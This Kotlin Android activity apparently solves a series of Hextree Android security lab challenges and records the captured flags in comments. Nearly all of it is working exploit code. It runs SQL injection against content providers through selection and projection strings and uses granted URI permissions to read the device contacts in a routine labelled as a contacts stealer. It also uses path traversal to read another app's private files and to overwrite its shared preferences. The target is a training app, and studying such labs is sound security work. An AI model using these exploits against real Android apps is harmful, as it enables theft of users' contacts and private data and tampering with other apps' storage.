package com.example.hetreepoc

import android.content.ComponentName
import android.content.ContentResolver
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.ParcelFileDescriptor
import android.util.Log
import android.widget.Button
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import java.io.BufferedInputStream
import java.io.BufferedReader
import java.io.BufferedWriter
import java.io.File
import java.io.FileInputStream
import java.io.FileReader
import java.io.FileWriter

class ContentProviderSolver : AppCompatActivity() {
    val FLAG_33_1_RC = 331
    val FLAG_34_RC = 34
    val FLAG_35_RC = 35
    val FLAG_36_RC = 36
    val STEAL_CONTACTS_RC = 1337

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_content_provider_solver)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        val flag30Button: Button = findViewById(R.id.flag30Button)
        flag30Button.setOnClickListener {
            val authority = "io.hextree.flag30"
            val cursor = contentResolver.query(
                Uri.parse("content://$authority/success"),
                null, null, null, null
            )
            Log.i("flag30", Utils.dumpContentProvider(cursor))
            cursor?.close() //HXT{query-provider-table-1vsd8}
        }
        val flag31Button: Button = findViewById(R.id.flag31Button)
        flag31Button.setOnClickListener {
            val authority = "io.hextree.flag31"
            val cursor = contentResolver.query(
                Uri.parse("content://$authority/flag/31"),
                null, null, null, null
            )
            Log.i("flag31", Utils.dumpContentProvider(cursor))
            cursor?.close() //HXT{query-uri-matcher-sakj1}
        }
        val flag32Button: Button = findViewById(R.id.flag32Button)
        flag32Button.setOnClickListener {
            val authority = "io.hextree.flag32"
            val selection = "1=1) OR visible=0 -- -" //Result: `visible=1 AND (1=1) OR visible=0 -- -)`
            val cursor = contentResolver.query(
                Uri.parse("content://$authority/flags"),
                null, selection, null, null
            )
            Log.i("flag32", Utils.dumpContentProvider(cursor))
            cursor?.close() //HXT{sql-injection-in-provider-1gs82}
        }
        val flag33_1Button: Button = findViewById(R.id.flag33_1Button)
        flag33_1Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag33Activity1"
            )
            intent.action = "io.hextree.FLAG33"
            //victim app sets the FLAG_GRANT_READ_URI_PERMISSION flag and the Intent's data
            startActivityForResult(intent, FLAG_33_1_RC)
        }

        val contactsStealerButton: Button = findViewById(R.id.contactsStealerButton)
        contactsStealerButton.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag8Activity"
            )
            intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION

            val authority = "com.android.contacts"
            intent.data = Uri.parse("content://$authority/raw_contacts")
            startActivityForResult(intent, STEAL_CONTACTS_RC)
        }

        val flag34Button: Button = findViewById(R.id.flag34Button)
        flag34Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag34Activity"
            )
            intent.putExtra("filename", "flags/flag34.txt")
            startActivityForResult(intent, FLAG_34_RC)
        }

        val flag35Button: Button = findViewById(R.id.flag35Button)
        flag35Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag35Activity"
            )
            intent.putExtra("filename", "../../../..//data/data/io.hextree.attacksurface/flag35.txt")
            startActivityForResult(intent, FLAG_35_RC)
        }
        val flag36Button: Button = findViewById(R.id.flag36Button)
        flag36Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag35Activity"
            )
            intent.putExtra("filename", "../../../../data/data/io.hextree.attacksurface/shared_prefs/Flag36Preferences.xml")
            startActivityForResult(intent, FLAG_36_RC)
        }

        val flag37Button: Button = findViewById(R.id.flag37Button)
        flag37Button.setOnClickListener {
            val bufferedWriter = BufferedWriter(FileWriter(File(filesDir, "give_flag.txt")))
            bufferedWriter.use {
                it.write("give flag")
            }

            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag37Activity"
            )
            intent.setData(Uri.parse(
                "content://com.example.hextreepoc.flag37/other_files/give_flag.txt"
            ))
            intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
            startActivity(intent) //HXT{file-name-query-187xh}
        }

        val shouldFinish = handleReceivedIntent()
        if(shouldFinish)
            finish()
    }

    private fun handleReceivedIntent(): Boolean {
        if (intent.action == "io.hextree.FLAG33" && intent.data.toString() == "content://io.hextree.flag33_2/flags") {
            assert(intent.flags and Intent.FLAG_GRANT_READ_URI_PERMISSION == Intent.FLAG_GRANT_READ_URI_PERMISSION)
            val maliciousProjection = arrayOf("* FROM Note; -- -")
            val cursor = contentResolver.query(
                intent.data!!,
                maliciousProjection, null, null, null
            )
            Log.i("flag33_2", Utils.dumpContentProvider(cursor))
            cursor?.close() //HXT{union-select-injection-1bs98}
            return false
        }

        return false
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if(requestCode == FLAG_33_1_RC) {
            Log.i("flag33_1", Utils.dumpIntent(this, data)) //contains FLAG_GRANT_READ_URI_PERMISSION
            // val maliciousProjection = arrayOf("* FROM sqlite_master; -- -")
            val maliciousProjection = arrayOf("* FROM Note; -- -")
            val cursor = contentResolver.query(
                data!!.data!!,
                maliciousProjection, null, null, null
            )
            Log.i("flag33_1", Utils.dumpContentProvider(cursor))
            cursor?.close() //HXT{union-select-injection-1bs98}
        } else if(requestCode == STEAL_CONTACTS_RC) {
            Log.i("STEAL_CONTACTS", Utils.dumpIntent(this, data))
            val cursor = contentResolver.query(
                data!!.data!!,
                null, null, null, null,
            )
            Log.i("STEAL_CONTACTS", Utils.dumpContentProvider(cursor))
            cursor?.close()
        } else if(requestCode == FLAG_34_RC) {
            Log.i("flag34", Utils.dumpIntent(this, data))
            val fd = contentResolver.openFileDescriptor(data!!.data!!, "r")
            if(fd != null ) {
                val bufferedReader = BufferedReader(FileReader(fd.fileDescriptor))
                val fileContents = bufferedReader.readText()
                bufferedReader.close()
                fd.close()
                Log.i("flag34", "fileContents:\n${fileContents}") //HXT{sharing-filedescriptors-av27s}
            }
        } else if(requestCode == FLAG_35_RC) {
            Log.i("flag35", Utils.dumpIntent(this, data))
            val fd = contentResolver.openFileDescriptor(data!!.data!!, "r")
            if(fd != null ) {
                val bufferedReader = BufferedReader(FileReader(fd.fileDescriptor))
                val fileContents = bufferedReader.use { it.readText() }
                fd.close()
                Log.i("flag35", "fileContents:\n${fileContents}") //HXT{path-traversal-stealer-s1hw9}
            }
        } else if(requestCode == FLAG_36_RC) {
            Log.i("flag36", Utils.dumpIntent(this, data))
            val fd = contentResolver.openFileDescriptor(data!!.data!!, "w")
            if(fd != null ) {
                val bufferedWriter = BufferedWriter(FileWriter(fd.fileDescriptor))
                bufferedWriter.use {
                    it.write(
                        """
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="solved" value="true" />
</map>
                        """.trimIndent() + "\n"
                    )
                }
                fd.close() //HXT{overwriting-shared-prefs-034nsd}
            }
        }
    }
}
